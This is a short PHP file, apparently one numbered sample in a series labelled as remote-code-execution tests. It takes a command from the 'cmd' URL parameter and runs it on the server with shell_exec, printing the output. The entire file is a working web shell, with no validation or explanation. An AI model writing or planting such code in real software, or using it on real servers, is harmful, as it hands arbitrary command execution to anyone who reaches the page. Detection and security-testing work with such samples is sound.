<?php
// RCE test variation #578
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>